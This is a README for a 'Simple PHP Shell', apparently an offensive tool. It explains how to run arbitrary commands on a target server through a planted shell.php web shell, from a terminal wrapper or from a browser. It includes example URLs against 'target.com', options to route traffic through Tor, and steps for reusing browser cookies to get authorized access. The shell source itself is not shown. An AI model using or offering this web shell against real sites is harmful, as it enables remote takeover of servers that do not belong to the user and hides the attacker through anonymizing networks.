# Simple PHP Shell

This is probably the simplest php shell you can get
and you can use it from your terminal

You can read the article about it here: https://marcocaggiano.medium.com/how-to-write-a-simple-php-shell-46a5cbc5cd14

## How To Use It

### From Terminal
```
$ chmod +x shell.sh
$ cat "https://target.com/shell.php?cmd={cmd}" > target
$ ./shell.sh ls -al /

/root
/home
/srv
...
```
### From Browser

Go to URL: *https://target.com/shell.php?cmd=YOUR_SHELL_COMMAND_HERE&html=true*

PHPINFO: *https://target.com/shell.php?cmd=phpinfo*

PHP.INI: *https://target.com/shell.php?cmd=phpini*

## Available Command Line Options

```
   -v VERBOSE MODE
   --tor CONNECT TO TOR
   --cookies USE cookies.txt COOKIES IF YOU NEED AUTHORIZATION
```
For cookies.txt you can use cookies.txt Chrome or Firefox Extension,
and save cookies.txt in the same directory where the shell.sh is executed.
